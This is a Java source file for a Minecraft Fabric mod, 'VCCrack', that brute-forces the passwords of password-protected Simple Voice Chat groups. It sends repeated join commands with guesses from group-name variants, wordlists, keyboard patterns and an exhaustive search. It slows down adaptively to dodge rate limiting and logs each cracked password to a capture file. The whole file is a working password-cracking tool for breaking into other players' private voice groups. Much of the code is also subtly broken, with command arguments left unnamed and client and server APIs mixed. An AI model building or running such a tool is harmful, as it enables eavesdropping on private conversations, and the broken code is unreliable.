package com.example.vccrack;

import net.fabricmc.api.ModInitializer;
import net.fabricmc.fabric.api.client.command.v2.ClientCommandRegistrationCallback;
import net.minecraft.client.MinecraftClient;
import net.minecraft.client.network.ClientPlayerEntity;
import com.mojang.brigadier.CommandDispatcher;
import com.mojang.brigadier.arguments.IntegerArgumentType;
import com.mojang.brigadier.arguments.StringArgumentType;
import com.mojang.brigadier.exceptions.CommandSyntaxException;
import de.maxhenkel.voicechat.api.VoicechatPlugin;
import de.maxhenkel.voicechat.api.EventRegistration;
import de.maxhenkel.voicechat.api.VoicechatConnection;
import de.maxhenkel.voicechat.api.Group;
import de.maxhenkel.voicechat.api.VoicechatServerStartedEvent;
import net.minecraft.text.Text;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.io.File;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.*;
import java.util.concurrent.ConcurrentLinkedQueue;

public class VoiceChatCrackMod implements ModInitializer, VoicechatPlugin {
    public static final String MOD_ID = "vccrack";
    public static final Logger LOGGER = LoggerFactory.getLogger(MOD_ID);
    public static final Path CONFIG_DIR = MinecraftClient.getInstance().runDirectory.toPath().resolve("config").resolve(MOD_ID);
    public static final Path WORDLIST_DIR = CONFIG_DIR.resolve("wordlists");
    public static final Path CAPTURE_LOG = CONFIG_DIR.resolve("capture.log");
    public static final Path PROGRESS_FILE = CONFIG_DIR.resolve("progress.json");

    private static volatile boolean cracking = false;
    private static volatile Thread crackingThread = null;
    private static volatile long attempts = 0;
    private static volatile String currentGroup = null;
    private static volatile String foundPassword = null;
    private static volatile long startTime = 0;
    private static volatile int currentDelayMs = 40;
    private static volatile int rejectStreak = 0;
    private static volatile boolean adaptiveEnabled = true;

    private static final ConcurrentLinkedQueue<String> recentPasswords = new ConcurrentLinkedQueue<>();
    private static final int RECENT_MAX = 24;

    private static char[] activeCharset = buildCharset("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+-=[]{}|;:,.<>?");
    private static volatile de.maxhenkel.voicechat.api.VoicechatServerApi api;

    @Override
    public void onInitialize() {
        LOGGER.info("[VCCrack] Initializing");
        try {
            Files.createDirectories(CONFIG_DIR);
            Files.createDirectories(WORDLIST_DIR);
        } catch (IOException e) {
            LOGGER.error("[VCCrack] Config dir error", e);
        }
        loadConfig();
        ClientCommandRegistrationCallback.EVENT.register(this::registerClientCommands);
    }

    @Override
    public String getPluginId() { return MOD_ID; }

    @Override
    public void initialize(de.maxhenkel.voicechat.api.VoicechatServerApi api) {
        VoiceChatCrackMod.api = api;
    }

    @Override
    public void registerEvents(EventRegistration registration) {
        registration.registerEvent(VoicechatServerStartedEvent.class, event ->
                LOGGER.info("[VCCrack] Active. /" + MOD_ID + " <group> [mode]"));
    }

    // ==================== COMMAND REGISTRATION ====================

    private void registerClientCommands(CommandDispatcher<net.minecraft.client.command.ClientCommandSource> dispatcher) {
        dispatcher.register(com.mojang.brigadier.Commands.literal(MOD_ID)
            .executes(context -> showHelp(context.getSource()))
            .then(StringArgumentType.string())
            .suggests((context, builder) -> {
                if (api == null) return builder.buildFuture();
                for (Group g : api.getGroups()) {
                    if (g.hasPassword()) builder.suggest(g.getName());
                }
                return builder.buildFuture();
            })
            // /vccrack <group> smart — heuristics first, then exhaustive 1-24
            .executes(context -> {
                String group = StringArgumentType.getString(context, "group_name");
                return crackSmart(context.getSource(), group);
            })
            // /vccrack <group> exhaustive [min] [max] — guaranteed full search space
            .then(com.mojang.brigadier.Commands.literal("exhaustive")
                .executes(context -> {
                    String group = StringArgumentType.getString(context, "group_name");
                    return runExhaustive(context.getSource(), group, 1, 24);
                })
                .then(IntegerArgumentType.integer(1, 24))
                .executes(context -> {
                    String group = StringArgumentType.getString(context, "group_name");
                    int max = IntegerArgumentType.getInteger(context, "max_len");
                    return runExhaustive(context.getSource(), group, 1, max);
                })
                .then(IntegerArgumentType.integer(1, 24))
                .then(IntegerArgumentType.integer(1, 24))
                .executes(context -> {
                    String group = StringArgumentType.getString(context, "group_name");
                    int min = IntegerArgumentType.getInteger(context, "min_len");
                    int max = IntegerArgumentType.getInteger(context, "max_len");
                    if (min > max) {
                        context.getSource().sendError(Text.literal("[VCCrack] min > max"));
                        return 0;
                    }
                    return runExhaustive(context.getSource(), group, min, max);
                })
            )
            // /vccrack <group> patterns — keyboard/structural patterns only
            .then(com.mojang.brigadier.Commands.literal("patterns")
                .executes(context -> {
                    String group = StringArgumentType.getString(context, "group_name");
                    return crackPatternsOnly(context.getSource(), group);
                })
            )
            .then(com.mojang.brigadier.Commands.literal("stop")
                .executes(context -> { stopCracking(); context.getSource().sendFeedback(Text.literal("[VCCrack] Stopped.")); return 1; })
            )
            .then(com.mojang.brigadier.Commands.literal("status")
                .executes(context -> { showStatus(context.getSource()); return 1; })
            )
            .then(com.mojang.brigadier.Commands.literal("charset")
                .executes(context -> showCharset(context.getSource()))
                .then(StringArgumentType.greedyString())
                .executes(context -> setCharset(context.getSource(), StringArgumentType.getString(context, "charset_str")))
            )
            .then(com.mojang.brigadier.Commands.literal("wordlist")
                .executes(context -> showWordlistHelp(context.getSource()))
                .then(com.mojang.brigadier.Commands.literal("list")
                    .executes(context -> listWordlists(context.getSource()))
                )
                .then(com.mojang.brigadier.Commands.literal("load").then(StringArgumentType.greedyString()))
                .executes(context -> loadWordlist(context.getSource(), StringArgumentType.getString(context, "filename")))
            )
            .then(com.mojang.brigadier.Commands.literal("adaptive")
                .executes(context -> toggleAdaptive(context.getSource()))
            )
        );
    }

    // ==================== SMART MODE ====================
    // Phase 1: group-name variants
    // Phase 2: wordlists
    // Phase 3: exhaustive full search space (length 1-24, every charset combo)

    private int crackSmart(net.minecraft.client.command.ClientCommandSource source, String groupName) {
        MinecraftClient client = MinecraftClient.getInstance();
        if (client == null || client.player == null || client.getNetworkHandler() == null) {
            source.sendError(Text.literal("[VCCrack] No client"));
            return 0;
        }
        if (cracking) {
            source.sendError(Text.literal("[VCCrack] Already running. /" + MOD_ID + " stop first."));
            return 0;
        }

        Group target = findPasswordGroup(groupName);
        if (target == null) {
            source.sendError(Text.literal("[VCCrack] No password-protected group: " + groupName));
            return 0;
        }

        if (api != null) {
            VoicechatConnection current = api.getConnectionOf(client.player.getUuid());
            if (current != null && current.getGroup() != null && groupName.equalsIgnoreCase(current.getGroup().getName())) {
                source.sendFeedback(Text.literal("[VCCrack] Already in '" + groupName + "'. Skipping."));
                return 1;
            }
        }

        cracking = true;
        attempts = 0;
        currentGroup = groupName;
        foundPassword = null;
        startTime = System.currentTimeMillis();
        currentDelayMs = 40;
        rejectStreak = 0;
        recentPasswords.clear();

        source.sendFeedback(Text.literal("[VCCrack] Smart exhaustive mode: " + groupName));
        source.sendFeedback(Text.literal("[VCCrack] Phase 1: Group-derived candidates"));
        source.sendFeedback(Text.literal("[VCCrack] Phase 2: Wordlists"));
        source.sendFeedback(Text.literal("[VCCrack] Phase 3: Exhaustive charset search len=1-24"));
        source.sendFeedback(Text.literal("[VCCrack] /" + MOD_ID + " stop to cancel"));

        crackingThread = new Thread(() -> {
            try {
                // Phase 1: Group-name variants
                if (runGroupVariants(client, groupName)) return;
                if (!cracking) return;

                // Phase 2: Wordlists
                if (runWordlists(client, groupName)) return;
                if (!cracking) return;

                // Phase 3: Exhaustive search (every length, every charset combo)
                source.sendFeedback(Text.literal("[VCCrack] Phase 3/3: Exhaustive search 1-24..."), false);
                runExhaustive(client, groupName, 1, 24);

            } finally {
                saveProgress();
                cracking = false;
                crackingThread = null;
                long elapsed = System.currentTimeMillis() - startTime;
                client.player.sendMessage(Text.literal("[VCCrack] Session ended. Attempts=" + attempts + " " + formatTime(elapsed)), false);
            }
        }, "VCCrack-smart-" + sanitize(groupName));

        crackingThread.start();
        return 1;
    }

    // ==================== PHASE 1: GROUP NAME VARIANTS ====================

    private boolean runGroupVariants(MinecraftClient client, String groupName) {
        List<String> candidates = new ArrayList<>();
        String g = groupName;

        // Direct name forms
        candidates.add(g);
        candidates.add(g.toLowerCase());
        candidates.add(g.toUpperCase());
        candidates.add(capitalize(g));

        // Common suffixes/prefixes
        String[] suffixes = {"1", "12", "123", "1234", "12345", "!", "!!", "!1", ".", "._", "_", "2024", "2025", "0", "01", "007"};
        String[] prefixes = {"!", "!!", "1", "12", "123"};

        for (String s : suffixes) {
            candidates.add(g + s);
            candidates.add(g.toLowerCase() + s);
            candidates.add(g.toUpperCase() + s);
        }
        for (String p : prefixes) {
            candidates.add(p + g);
            candidates.add(p + g.toLowerCase());
        }

        // Leet speak substitutions
        String leet = g.toLowerCase()
            .replace("a", "4")
            .replace("e", "3")
            .replace("i", "1")
            .replace("o", "0")
            .replace("s", "5")
            .replace("t", "7");
        candidates.add(leet);
        candidates.add(capitalize(leet));
        candidates.add(g + leet);
        candidates.add(leet + g);

        // Keyboard smash variants from group name chars
        candidates.add(g.replace(" ", "").toLowerCase());
        candidates.add(g.replace(" ", "_").toLowerCase());
        candidates.add(g.replace(" ", "").toUpperCase());

        client.player.sendMessage(Text.literal("[VCCrack] Phase 1/3: Trying " + candidates.size() + " group-derived candidates..."), false);

        int idx = 0;
        for (String pw : candidates) {
            if (!cracking) return false;
            if (pw.length() > 24) continue;
            if (attemptJoin(client, groupName, pw)) {
                foundPassword = pw;
                client.player.sendMessage(Text.literal("[VCCrack] GROUP-VARIANT MATCH: " + pw), false);
                saveCapture(groupName, pw, "group_variant");
                return true;
            }
            attempts++;
            idx++;
            if (idx % 200 == 0) {
                client.player.sendMessage(Text.literal("[VCCrack] Phase 1 progress: " + idx + "/" + candidates.size()), false);
            }
        }
        return false;
    }

    // ==================== PHASE 2: WORDLISTS ====================

    private boolean runWordlists(MinecraftClient client, String groupName) {
        File dir = WORDLIST_DIR.toFile();
        if (!dir.exists()) return false;
        String[] files = dir.list();
        if (files == null || files.length == 0) return false;

        for (String filename : files) {
            if (!cracking) return false;
            File file = WORDLIST_DIR.resolve(filename).toFile();
            if (!file.isFile()) continue;
            client.player.sendMessage(Text.literal("[VCCrack] Phase 2/3: Wordlist " + filename + "..."), false);
            try {
                List<String> lines = Files.readAllLines(file.toPath());
                int idx = 0;
                for (String pw : lines) {
                    if (!cracking) return false;
                    pw = pw.trim();
                    if (pw.isEmpty() || pw.length() > 24) continue;
                    if (attemptJoin(client, groupName, pw)) {
                        foundPassword = pw;
                        client.player.sendMessage(Text.literal("[VCCrack] WORDLIST MATCH (" + filename + "): " + pw), false);
                        saveCapture(groupName, pw, "wordlist:" + filename);
                        saveProgress();
                        return true;
                    }
                    attempts++;
                    idx++;
                    if (idx % 500 == 0) {
                        client.player.sendMessage(Text.literal("[VCCrack] Wordlist " + idx + "/" + lines.size()), false);
                        saveProgress();
                    }
                }
            } catch (IOException e) {
                client.player.sendMessage(Text.literal("[VCCrack] Wordlist error: " + e.getMessage()), false);
            }
        }
        return false;
    }

    // ==================== PHASE 3: EXHAUSTIVE SEARCH ====================
    // Tries EVERY possible password of every length from minLen to maxLen.
    // This is O(charset^maxLen) and will find ANY password in the search space.

    private boolean runExhaustive(MinecraftClient client, String groupName, int minLen, int maxLen) {
        return runExhaustive(client, groupName, minLen, maxLen, null);
    }

    private boolean runExhaustive(MinecraftClient client, String groupName, int minLen, int maxLen, int[] startIndices) {
        ClientPlayerEntity player = client.player;
        if (player == null) return false;

        client.player.sendMessage(Text.literal("[VCCrack] Exhaustive search len=" + minLen + "-" + maxLen + " charset=" + activeCharset.length), false);

        for (int len = minLen; len <= maxLen; len++) {
            if (!cracking) return false;

            long combosForLen = pow(activeCharset.length, len);
            client.player.sendMessage(Text.literal("[VCCrack] Length " + len + " | " + formatNumber(combosForLen) + " combos"), false);

            int[] indices = new int[len];
            if (startIndices != null && startIndices.length == len) {
                System.arraycopy(startIndices, 0, indices, 0, len);
            }

            while (true) {
                if (!cracking) return false;

                StringBuilder sb = new StringBuilder(len);
                for (int i = 0; i < len; i++) sb.append(activeCharset[indices[i]]);
                String guess = sb.toString();

                if (attemptJoin(client, groupName, guess)) {
                    foundPassword = guess;
                    player.sendMessage(Text.literal("[VCCrack] EXHAUSTIVE MATCH len=" + len + ": " + guess), false);
                    saveCapture(groupName, guess, "exhaustive");
                    saveProgress();
                    return true;
                }

                attempts++;
                if (attempts % 5000 == 0) {
                    player.sendMessage(Text.literal("[VCCrack] attempts=" + attempts + " len=" + len + " last=" + guess + " delay=" + currentDelayMs + "ms"), false);
                    saveProgress();
                }

                // odometer increment
                int pos = len - 1;
                while (pos >= 0) {
                    indices[pos]++;
                    if (indices[pos] < activeCharset.length) break;
                    indices[pos] = 0;
                    pos--;
                }
                if (pos < 0) break; // length exhausted
            }
        }
        return false;
    }

    // ==================== PATTERNS MODE ====================

    private int crackPatternsOnly(net.minecraft.client.command.ClientCommandSource source, String groupName) {
        MinecraftClient client = MinecraftClient.getInstance();
        if (client == null || client.player == null || client.getNetworkHandler() == null) {
            source.sendError(Text.literal("[VCCrack] No client"));
            return 0;
        }
        if (cracking) {
            source.sendError(Text.literal("[VCCrack] Already running."));
            return 0;
        }
        Group target = findPasswordGroup(groupName);
        if (target == null) {
            source.sendError(Text.literal("[VCCrack] No password-protected group: " + groupName));
            return 0;
        }
        if (api != null) {
            VoicechatConnection current = api.getConnectionOf(client.player.getUuid());
            if (current != null && current.getGroup() != null && groupName.equalsIgnoreCase(current.getGroup().getName())) {
                source.sendFeedback(Text.literal("[VCCrack] Already in '" + groupName + "'."));
                return 1;
            }
        }
        cracking = true;
        attempts = 0;
        currentGroup = groupName;
        foundPassword = null;
        startTime = System.currentTimeMillis();
        recentPasswords.clear();
        source.sendFeedback(Text.literal("[VCCrack] Patterns-only mode: " + groupName));
        crackingThread = new Thread(() -> {
            try {
                if (runPatterns(client, groupName)) return;
                client.player.sendMessage(Text.literal("[VCCrack] Pattern search complete."), false);
            } finally {
                saveProgress();
                cracking = false;
                crackingThread = null;
            }
        }, "VCCrack-patterns-" + sanitize(groupName));
        crackingThread.start();
        return 1;
    }

    private boolean runPatterns(MinecraftClient client, String groupName) {
        List<String> all = new ArrayList<>();
        generateAllPatterns(all, groupName);
        client.player.sendMessage(Text.literal("[VCCrack] Generated " + all.size() + " patterns"), false);
        int idx = 0;
        for (String pw : all) {
            if (!cracking) return false;
            if (attemptJoin(client, groupName, pw)) {
                foundPassword = pw;
                client.player.sendMessage(Text.literal("[VCCrack] PATTERN MATCH: " + pw), false);
                saveCapture(groupName, pw, "pattern");
                return true;
            }
            attempts++;
            idx++;
            if (idx % 2000 == 0) {
                client.player.sendMessage(Text.literal("[VCCrack] Patterns " + idx + "/" + all.size()), false);
                saveProgress();
            }
        }
        return false;
    }

    private void generateAllPatterns(List<String> out, String groupName) {
        // QWERTY row runs
        String[] rows = {"qwertyuiop", "asdfghjkl", "zxcvbnm", "QWERTYUIOP", "ASDFGHJKL", "ZXCVBNM", "1234567890", "!@#$%^&*()"};
        for (String row : rows) {
            for (int len = 2; len <= row.length(); len++) {
                for (int start = 0; start <= row.length() - len; start++) {
                    out.add(row.substring(start, start + len));
                }
                String rev = new StringBuilder(row).reverse().toString();
                for (int start = 0; start <= rev.length() - len; start++) {
                    out.add(rev.substring(start, start + len));
                }
            }
        }

        // Repeated keys
        char[] bases = "abcdefghijklmnopqrstuvwxyz0123456789".toCharArray();
        for (char base : bases) {
            for (int len = 2; len <= 24; len++) {
                char[] c = new char[len];
                Arrays.fill(c, base);
                out.add(new String(c));
                if (Character.isLowerCase(base)) {
                    char[] c2 = new char[len];
                    Arrays.fill(c2, Character.toUpperCase(base));
                    out.add(new String(c2));
                }
            }
        }

        // Common smashes and shortcuts
        out.addAll(Arrays.asList(
            "qwerty", "asdf", "zxcv", "qwer", "asdfgh", "zxcvbn", "qwertyuiop", "asdfghjkl", "zxcvbnm",
            "qwop", "1234", "12345", "123456", "1234567", "12345678", "123456789",
            "asdf123", "qwerty123", "password1", "passw0rd", "abcd", "abcde", "abcdef",
            "QWERTY", "ASDF", "ZXCV", "Qwerty", "Asdf", "Zxcv",
            "1111", "2222", "3333", "aaaa", "bbbb", "cccc",
            "qwerty!", "asdf!", "zxcv!", "123!", "!@#",
            "qwertyui", "asdfgh", "zxcvbn", "qwertyuiop123"
        ));

        // Group-derived patterns
        if (groupName != null && !groupName.isEmpty()) {
            String g = groupName;
            out.add(g);
            out.add(g.toLowerCase());
            out.add(g.toUpperCase());
            out.add(capitalize(g));
            out.add(g + "1");
            out.add(g + "12");
            out.add(g + "123");
            out.add(g + "1234");
            out.add("1" + g);
            out.add("123" + g);
            out.add(g + "!");
            out.add(g + "!!");
            out.add(g + "@");
            out.add(g + ".");
            out.add(g + "_");
            out.add(g.replace(" ", ""));
            out.add(g.replace(" ", "_"));
        }

        // Deduplicate preserving order
        Set<String> seen = new LinkedHashSet<>(out);
        out.clear();
        out.addAll(seen);
    }

    // ==================== JOIN + ADAPTIVE RATE LIMIT ====================

    private boolean attemptJoin(MinecraftClient client, String groupName, String password) {
        try {
            String cmd = "voicechat join \"" + escape(groupName) + "\" " + password;
            client.getNetworkHandler().sendCommand(cmd);
            recentPasswords.add(password);
            while (recentPasswords.size() > RECENT_MAX) recentPasswords.poll();
            Thread.sleep(currentDelayMs);
        } catch (Exception e) {
            return false;
        }

        if (!cracking) return false;

        boolean ok = false;
        if (api != null) {
            try {
                for (int i = 0; i < 6; i++) {
                    if (!cracking) return false;
                    Thread.sleep(100);
                    VoicechatConnection conn = api.getConnectionOf(client.player.getUuid());
                    if (conn != null && conn.getGroup() != null && groupName.equalsIgnoreCase(conn.getGroup().getName())) {
                        ok = true;
                        break;
                    }
                }
            } catch (Exception ignored) { }
        }

        if (ok) { onSuccess(); return true; }
        onReject();
        return false;
    }

    private void onSuccess() {
        rejectStreak = 0;
        if (adaptiveEnabled && currentDelayMs > 40) {
            currentDelayMs = Math.max(40, currentDelayMs - 20);
        }
    }

    private void onReject() {
        if (!adaptiveEnabled) return;
        rejectStreak++;
        if (rejectStreak >= 25) {
            currentDelayMs += 150;
            rejectStreak = 0;
            if (crackingThread != null) crackingThread.interrupt();
        }
    }

    // ==================== SUCCESS SIGNAL ====================

    public static void signalSuccess() {
        if (foundPassword != null || !cracking) return;
        String last = recentPasswords.peek();
        if (last != null) foundPassword = last;
        cracking = false;
        if (crackingThread != null) {
            crackingThread.interrupt();
            crackingThread = null;
        }
    }

    // ==================== STOP / STATUS ====================

    private void stopCracking() {
        cracking = false;
        if (crackingThread != null) {
            crackingThread.interrupt();
            crackingThread = null;
        }
        saveProgress();
    }

    private void showStatus(net.minecraft.client.command.ClientCommandSource source) {
        if (!cracking) {
            source.sendFeedback(Text.literal("[VCCrack] Idle" + (foundPassword != null ? " | Last found: " + foundPassword : "")));
            return;
        }
        long elapsed = System.currentTimeMillis() - startTime;
        source.sendFeedback(Text.literal("[VCCrack] Running"));
        source.sendFeedback(Text.literal("Attempts: " + attempts));
        source.sendFeedback(Text.literal("Group: " + currentGroup));
        source.sendFeedback(Text.literal("Found: " + (foundPassword != null ? foundPassword : "none")));
        source.sendFeedback(Text.literal("Delay: " + currentDelayMs + "ms adaptive=" + adaptiveEnabled));
        source.sendFeedback(Text.literal("Elapsed: " + formatTime(elapsed)));
        source.sendFeedback(Text.literal("Progress: " + PROGRESS_FILE));
    }

    // ==================== HELPERS ====================

    private Group findPasswordGroup(String groupName) {
        if (api == null) return null;
        for (Group g : api.getGroups()) {
            if (g.hasPassword() && g.getName().equalsIgnoreCase(groupName)) return g;
        }
        return null;
    }

    private void saveCapture(String group, String password, String phase) {
        try {
            String line = String.format("%s | %s | group=%s | pass=%s%n", new Date(), phase, group, password);
            Files.writeString(CAPTURE_LOG, line, java.nio.file.StandardOpenOption.CREATE, java.nio.file.StandardOpenOption.APPEND);
        } catch (IOException ignored) { }
    }

    private void saveProgress() {
        try {
            String s = String.format("group=%s,attempts=%d,found=%s,delay=%d,adaptive=%b,charset=%s%n",
                currentGroup != null ? currentGroup : "",
                attempts,
                foundPassword != null ? foundPassword : "",
                currentDelayMs,
                adaptiveEnabled,
                new String(activeCharset));
            Files.writeString(PROGRESS_FILE, s);
        } catch (IOException ignored) { }
    }

    private void loadConfig() {
        File f = CONFIG_DIR.resolve("vccrack.txt").toFile();
        if (!f.exists()) return;
        try (FileReader r = new FileReader(f)) {
            StringBuilder sb = new StringBuilder();
            int c;
            while ((c = r.read()) != -1) sb.append((char) c);
            for (String line : sb.toString().split("\n")) {
                if (line.startsWith("charset=")) activeCharset = buildCharset(line.substring(8));
                else if (line.startsWith("adaptive=")) adaptiveEnabled = Boolean.parseBoolean(line.substring(9));
            }
        } catch (IOException e) {
            LOGGER.warn("[VCCrack] Config load failed", e);
        }
    }

    private void saveConfig() {
        File f = CONFIG_DIR.resolve("vccrack.txt").toFile();
        try (FileWriter w = new FileWriter(f)) {
            w.write("charset=" + new String(activeCharset) + "\n");
            w.write("adaptive=" + adaptiveEnabled + "\n");
            w.write("delay_ms=" + currentDelayMs + "\n");
        } catch (IOException e) {
            LOGGER.warn("[VCCrack] Config save failed", e);
        }
    }

    private int showHelp(net.minecraft.client.command.ClientCommandSource source) {
        source.sendFeedback(Text.literal("[VCCrack] Exhaustive search modes:"));
        source.sendFeedback(Text.literal("/" + MOD_ID + " <group>              smart: variants + wordlists + exhaustive 1-24"));
        source.sendFeedback(Text.literal("/" + MOD_ID + " <group> exhaustive    exhaustive search 1-24"));
        source.sendFeedback(Text.literal("/" + MOD_ID + " <group> exhaustive <max>"));
        source.sendFeedback(Text.literal("/" + MOD_ID + " <group> exhaustive <min> <max>"));
        source.sendFeedback(Text.literal("/" + MOD_ID + " <group> patterns     keyboard patterns only"));
        source.sendFeedback(Text.literal("/" + MOD_ID + " stop | status | adaptive | charset <str> | wordlist load <file>"));
        return 1;
    }

    private int showWordlistHelp(net.minecraft.client.command.ClientCommandSource source) {
        source.sendFeedback(Text.literal("[VCCrack] Wordlists: " + WORDLIST_DIR));
        source.sendFeedback(Text.literal("/" + MOD_ID + " wordlist list"));
        source.sendFeedback(Text.literal("/" + MOD_ID + " wordlist load <file>"));
        return 1;
    }

    private int listWordlists(net.minecraft.client.command.ClientCommandSource source) {
        File dir = WORDLIST_DIR.toFile();
        String[] files = dir.list();
        if (files == null || files.length == 0) {
            source.sendFeedback(Text.literal("[VCCrack] No wordlists"));
            return 1;
        }
        for (String f : files) source.sendFeedback(Text.literal(" - " + f));
        return 1;
    }

    private int loadWordlist(net.minecraft.client.command.ClientCommandSource source, String filename) {
        File file = WORDLIST_DIR.resolve(filename).toFile();
        if (!file.exists()) { source.sendError(Text.literal("[VCCrack] Not found: " + file)); return 0; }
        try { source.sendFeedback(Text.literal("[VCCrack] Loaded " + Files.readAllLines(file.toPath()).size() + " lines")); }
        catch (IOException e) { source.sendError(Text.literal("[VCCrack] " + e.getMessage())); return 0; }
        return 1;
    }

    private int showCharset(net.minecraft.client.command.ClientCommandSource source) {
        source.sendFeedback(Text.literal("[VCCrack] Charset (" + activeCharset.length + "): " + new String(activeCharset)));
        return 1;
    }

    private int setCharset(net.minecraft.client.command.ClientCommandSource source, String charsetStr) {
        if (charsetStr == null || charsetStr.isEmpty()) { source.sendError(Text.literal("[VCCrack] Empty")); return 0; }
        activeCharset = buildCharset(charsetStr);
        saveConfig();
        source.sendFeedback(Text.literal("[VCCrack] Charset set size=" + activeCharset.length));
        return 1;
    }

    private int toggleAdaptive(net.minecraft.client.command.ClientCommandSource source) {
        adaptiveEnabled = !adaptiveEnabled;
        source.sendFeedback(Text.literal("[VCCrack] Adaptive rate limit: " + adaptiveEnabled));
        if (!adaptiveEnabled) currentDelayMs = 40;
        return 1;
    }

    // ==================== UTILITIES ====================

    private static char[] buildCharset(String s) { return s.toCharArray(); }

    private static String capitalize(String s) {
        if (s == null || s.isEmpty()) return s;
        return Character.toUpperCase(s.charAt(0)) + s.substring(1);
    }

    private static String sanitize(String s) { return s.replaceAll("[^a-zA-Z0-9_-]", "_"); }

    private static String escape(String s) { return s.replace("\"", "\\\""); }

    private static String formatTime(long ms) {
        long s = ms / 1000, m = s / 60, h = m / 60;
        if (h > 0) return String.format("%dh %dm %ds", h, m % 60, s % 60);
        if (m > 0) return String.format("%dm %ds", m, s % 60);
        return s + "s";
    }

    private static String formatNumber(long n) {
        if (n >= 1_000_000_000_000_000_000L) return String.format("%.2fqi", n / 1e18);
        if (n >= 1_000_000_000_000_000L) return String.format("%.2fqa", n / 1e15);
        if (n >= 1_000_000_000_000L) return String.format("%.2ft", n / 1e12);
        if (n >= 1_000_000_000L) return String.format("%.2fb", n / 1e9);
        if (n >= 1_000_000L) return String.format("%.2fm", n / 1e6);
        if (n >= 1_000L) return String.format("%.2fk", n / 1e3);
        return String.valueOf(n);
    }

    private static long pow(long base, int exp) {
        long result = 1;
        for (int i = 0; i < exp; i++) result *= base;
        return result;
    }
}
